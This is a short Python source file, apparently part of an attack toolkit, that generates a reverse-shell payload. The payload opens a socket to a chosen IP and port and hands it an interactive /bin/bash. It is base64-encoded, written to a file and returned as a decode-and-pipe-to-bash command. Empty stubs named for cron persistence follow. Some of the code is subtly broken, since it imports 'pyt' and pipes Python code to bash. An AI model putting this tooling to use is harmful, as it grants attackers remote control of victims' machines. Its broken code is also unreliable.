import colors
import base64
import os



def copyReverse(ip,port=1969,path=""):
    shell = """
import socket,subprocess,os,pyt
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("IP",PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
    """
    shell=shell.replace("\n",";")
    shell=shell.replace("IP",ip)
    shell=shell.replace("PORT",str(port))
    filename = "shell"
    os.system(f"echo '{base64.b64encode(shell.encode('ascii')).decode('ascii')}' > {path+filename}")
    return f"base64 -d {path+filename} | bash"

def reverse():
    pass

def cronBoot():
    pass

def cronLoop():
    pass
